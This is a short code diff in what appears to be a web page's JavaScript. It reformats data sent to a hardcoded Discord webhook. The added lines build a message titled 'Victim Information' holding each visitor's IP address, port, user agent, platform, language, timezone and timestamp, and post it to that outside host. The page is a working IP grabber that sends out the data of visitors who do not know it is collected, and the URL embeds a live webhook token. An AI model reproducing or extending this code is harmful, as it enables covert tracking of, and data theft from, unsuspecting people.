@@ -88,9 +88,19 @@
         async function sendToWebhook(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1461964964603625594/jH-XEtXJtxJm69mjlFViAi8BQWutT-P6wTioZ-tElKw3BlJihCEeuNB2AazCCIjgKQKU';
             
-            // Convert to text file content
-            const fileContent = JSON.stringify(info, null, 2);
-            
+            // Format the message
+            const message = `
+**Victim Information:**
+- IP Address: ${info.ip}
+- Port Number: ${info.port}
+- User Agent: ${info.userAgent}
+- Platform: ${info.platform}
+- Language: ${info.language}
+- Cookie Enabled: ${info.cookieEnabled}
+- Timezone: ${info.timezone}
+- Timestamp: ${info.timestamp}
+            `.trim();
+
             // Send to webhook
             const response = await fetch(webhookUrl, {
                 method: 'POST',
@@ -98,7 +108,7 @@
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    content: fileContent
+                    content: message
                 })
             });
 
